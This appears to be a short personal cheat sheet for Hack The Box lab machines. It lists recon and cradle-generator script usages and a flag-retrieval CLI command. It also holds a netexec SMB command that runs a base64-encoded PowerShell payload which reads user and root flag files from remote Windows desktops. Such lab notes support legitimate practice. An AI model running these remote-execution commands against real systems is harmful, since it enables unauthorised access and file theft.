# hackthebox
#target/remote #os/linux

## recon_setup.py
```
recon_setup.py <machine_name> -v <vpn_path> -s <session_path> -i <ip> -a
```

## cradle_gen.py
```
cradle_gen.py <lhost> <lport> -l
```

## windows remote flags
```
nxc smb <ip> -u <user|Administrator> <auth> -x 'powershell -e ZABpAHIAIABDADoAXABVAHMAZQByAHMAIAAtAE4AYQBtAGUAfAAlAHsAdAB5AHAAZQAgACIAQwA6AFwAVQBzAGUAcgBzAFwAJABfAFwARABlAHMAawB0AG8AcABcAHUAcwBlAHIALgB0AHgAdAAiACAAMgA+ACQAbgB1AGwAbAB9ADsAdAB5AHAAZQAgAEMAOgBcAFUAcwBlAHIAcwBcAEEAZABtAGkAbgBpAHMAdAByAGEAdABvAHIAXABEAGUAcwBrAHQAbwBwAFwAcgBvAG8AdAAuAHQAeAB0ACAAMgA+ACQAbgB1AGwAbAA='
```

## Linux remote flag
```
htb-cli getflag -u '<user>' -p <password>
```
